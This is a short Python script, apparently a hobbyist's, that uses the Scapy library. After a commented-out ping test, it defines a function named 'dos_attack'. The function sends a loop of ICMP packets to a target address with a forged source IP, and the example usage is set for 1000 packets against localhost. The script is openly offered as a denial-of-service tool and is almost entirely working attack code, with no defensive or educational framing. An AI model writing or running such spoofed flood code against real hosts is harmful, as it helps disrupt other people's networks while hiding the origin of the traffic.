# from scapy.all import IP, ICMP, sr1

# def test_scapy():
#     pkt = IP(dst="8.8.8.8")/ICMP()
#     resp = sr1(pkt, timeout=2)
#     if resp:
#         resp.show()
#     else:
#         print("No response received.")

# try:
#     test_scapy()
# except Exception as e:
#     print(f"An error occurred: {e}")

from scapy.all import IP, ICMP, send

def dos_attack(target_ip, fake_source_ip, count=100):
    try:
        # Create and send the packets
        for _ in range(count):
            packet = IP(src=fake_source_ip, dst=target_ip) / ICMP()
            send(packet, verbose=False)
        print(f"DoS attack initiated from {fake_source_ip} to {target_ip}.")
    except Exception as e:
        print(f"An error occurred: {e}")

# Example usage
if __name__ == "__main__":
    target_ip = "127.0.0.1"
    target_port = 8000
    fake_source_ip = "FAKE_SOURCE_IP_ADDRESS"  # Replace with the fake source IP address
    dos_attack(target_ip, fake_source_ip, count=1000)  # Adjust the count as needed
